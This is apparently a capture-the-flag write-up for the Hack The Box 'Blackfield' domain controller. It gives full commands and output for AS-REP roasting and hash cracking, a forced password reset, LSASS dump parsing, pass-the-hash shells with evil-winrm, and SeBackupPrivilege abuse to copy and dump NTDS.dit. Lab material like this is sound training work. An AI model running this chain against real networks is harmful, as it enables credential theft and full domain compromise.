# Initial Enemuration 
```bash
**sudo nmap -sS 10.129.63.155**
Starting Nmap 7.92 ( https://nmap.org ) at 2025-02-15 00:11 +01
Nmap scan report for 10.129.63.155
Host is up (0.10s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap done: 1 IP address (1 host up) scanned in 30.46 seconds
```
from the nmap output it looks like it's a Domain Controller, let's find the name of the domain in question.
```bash
netexec smb 10.129.62.228
SMB         10.129.62.228   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
```
# Enemurating services
after Enemurating services and find that it's possible to enumerate annonymously using smb and list shares.
```bash
smbclient -N -L '\\10.129.62.228\'                 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	forensic        Disk      Forensic / Audit share.
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	profiles$       Disk      
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

```
### SMB(Profiles$ share)
I found it's possible to view the profiles$ share
```bash
smbclient -N '\\10.129.62.228\profiles$'                                     
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 17:47:12 2020
  ..                                  D        0  Wed Jun  3 17:47:12 2020
  AAlleni                             D        0  Wed Jun  3 17:47:11 2020
  ABarteski                           D        0  Wed Jun  3 17:47:11 2020
  ABekesz                             D        0  Wed Jun  3 17:47:11 2020
  ABenzies                            D        0  Wed Jun  3 17:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 17:47:11 2020
  AChampken                           D        0  Wed Jun  3 17:47:11 2020
  ACheretei                           D        0  Wed Jun  3 17:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 17:47:11 2020
  AHigchens                           D        0  Wed Jun  3 17:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 17:47:11 2020
  AKlado                              D        0  Wed Jun  3 17:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 17:47:11 2020
  AKollolli                           D        0  Wed Jun  3 17:47:11 2020
  AKruppe                             D        0  Wed Jun  3 17:47:11 2020
<snip>
```
we found a lot of usernames what we can do, till now we have nothing I thought of doing a brute force but kerberos authentication comes to my mind so let's try it to this usernames
 ```bash
GetNPUsers.py blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.129.62.228
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
<snip>
$krb5asrep$23$support@BLACKFIELD.LOCAL:5a69595ef29571ede6c80ce7ecf15d21$7adff11d72c1c32df20a07dd5240d84c30bb76bbfb3d26789d48030904ab9f7a53334ab5f3db52531ac78fddf287d3504090d2f6c84101994e963ff5fec6e407189393ee4694774f96bf2d213c3daf057a3804734f860b726b01a84bd2b21719f1d1272c0a156b4d3727cba30519d42e5959ef768125e8d9e60c5315924f8a19cd6f13c62d85cf1877ec8134baf183590355d518fef77bdce3b0af91d93ad946f50a6d2783c0618232a7708bb2aba40536180e8be4f9a240234a67962d23023b644468037b98b752bf2d2a53c150a7759f61eae3c7db2fd804da55a27caf97d3ec0ae36b3d3b10a562108cf5b530747f142a03e4
<snip>
```
and as we see support user have kerberos preauthentication is enabled so let's crack the ticket.
```bash
hashcat -m 18200 support.hash ~/HackTheBox/apps/administrator/rock.txt
<snip>
$krb5asrep$23$support@BLACKFIELD.LOCAL:5a69595ef29571ede6c80ce7ecf15d21$7adff11d72c1c32df20a07dd5240d84c30bb76bbfb3d26789d48030904ab9f7a53334ab5f3db52531ac78fddf287d3504090d2f6c84101994e963ff5fec6e407189393ee4694774f96bf2d213c3daf057a3804734f860b726b01a84bd2b21719f1d1272c0a156b4d3727cba30519d42e5959ef768125e8d9e60c5315924f8a19cd6f13c62d85cf1877ec8134baf183590355d518fef77bdce3b0af91d93ad946f50a6d2783c0618232a7708bb2aba40536180e8be4f9a240234a67962d23023b644468037b98b752bf2d2a53c150a7759f61eae3c7db2fd804da55a27caf97d3ec0ae36b3d3b10a562108cf5b530747f142a03e4
:#00^BlackKnight
```
# Credentield Enemuration
now that we have credentiels let's try to use bloodhound and have a full overview and knowledge about the domain.
```bash
bloodhound-python  -u support -p '#00^BlackKnight' -ns 10.129.62.228 -d blackfield.local -c all
```
after oppenning bloodhound GUI we see that support user have forcechangepassword on audit2020 user.
![Screenshot from 2025-02-17 18-50-04](https://github.com/user-attachments/assets/fe2b1be0-91ce-433a-96d4-9c3db118ef5f)

let's change tha password
```bash
net rpc password "audit2020" "newP@ssword2022" -U "blackfield.local"/"support"%'#00^BlackKnight' -S "10.129.62.228"
```
the first thing that comes to my mind after seing Audit2020 uccount is the forensic share let's try to log in that share and see what we can find
```bash
smbclient -U 'audit2020' '\\10.129.62.228\forensic'
Password for [SAMBA\audit2020]:
^[[HTry "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 14:03:16 2020
  ..                                  D        0  Sun Feb 23 14:03:16 2020
  commands_output                     D        0  Sun Feb 23 19:14:37 2020
  memory_analysis                     D        0  Thu May 28 20:28:33 2020
  tools                               D        0  Sun Feb 23 14:39:08 2020

		5102079 blocks of size 4096. 1574120 blocks available
smb: \> 
```
after downloading all the files I found NTDS.DIT file
```bash
pypykatz lsa minidump lsass.DMP
<sniip>
== LogonSession ==
authentication_id 406499 (633e3)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406499
	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
	== WDIGEST [633e3]==
		username svc_backup
		domainname BLACKFIELD
		password None
	== Kerberos ==
		Username: svc_backup
		Domain: BLACKFIELD.LOCAL
<snip>
```
after executing pypykatz I have found an administrator hash and svc_backup hash, ofcourse the administrator hash didn't work but the svc_backup hash gave me a session in WinRM
```bash
 evil-winrm -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d' -i 10.129.62.228   
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> dir


    Directory: C:\Users\svc_backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   2:26 PM             32 user.txt
```
# Privilege Escalation
since teh svc_backup is a memebre of the backup operators group he's gonna have SebackupPrivilege.
```bash
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv


Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
and it's enabled
let's try to leverage this Privilege
```bash
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> Import-Module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> Import-Module .\SeBackupPrivilegeCmdLets.dll
```
As the NTDS.dit file is locked by default, we can use the Windows diskshadow utility to create a shadow copy of the C drive and expose it as E drive. The NTDS.dit in this shadow copy won't be in use by the system.
```bash
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% h:
end backup
exit
```
write this script to a file in the C:\Windows\temp and execute this command 
```bash
diskshadow /s backup
```bash
*Evil-WinRM* PS C:\windows\temp> Copy-FileSeBackupPrivilege h:\Windows\NTDS\ntds.dit C:\windows\temp\ntds.dit

*Evil-WinRM* PS C:\windows\temp> reg save HKLM\SYSTEM SYSTEM.SAV
The operation completed successfully.
```
download NTDS.dit and SYSTEM.SAV to you local machine and dump hashes using secretdump.py
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL        
```
and we got the administrator hash
# PWNED
```bash
evil-winrm -u administrator -H '184fb5e5178480be64824d4cd53b99ee' -i 10.129.62.228
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   4:36 PM            447 notes.txt
-a----        11/5/2020   8:38 PM             32 root.txt

```
